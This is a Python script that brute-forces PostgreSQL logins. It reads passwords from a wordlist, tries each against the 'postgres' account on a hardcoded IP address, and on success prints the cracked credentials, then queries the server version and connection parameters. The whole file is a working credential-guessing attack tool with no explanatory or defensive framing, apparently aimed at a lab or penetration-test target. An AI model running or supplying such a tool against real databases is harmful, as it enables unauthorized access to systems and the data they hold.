#!/usr/bin/python3.7
import psycopg2
fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
app  = '\033[92m[*]\033[0m'
att = '\033[93m[!]\033[0m'
green = '\033[92m'
nocolor= '\033[0m'

msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
username="postgres"
wordlist="wordlist.txt"
target='10.171.1.129'
postgres_server = app + ' - PostgreSQL Server IP: ' + target
postgres_enum = att + " -  PostgreSQL version enumeration: \n" 
postgres_generic = att + " - Generic information about the PostgreSQL connection: "

postgreconn = psycopg2

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            postgreconn = psycopg2.connect(user = username, password = _password, host = target, port = "5432", database = "postgres")

            print(ok + msg_ok + green + username + nocolor + msg_pass + green + _password + nocolor)
            print(postgres_server)

            prompt = postgreconn.cursor()
            
            prompt.execute("Select version();")
            version = prompt.fetchone()
            print( postgres_enum  + str(version) + "\n")
            
            propriety = postgreconn.get_dsn_parameters()
            print(postgres_generic)
            print(propriety) 
            postgreconn.close()

        except:
            print( fail + msg_fail + username + msg_pass + _password)
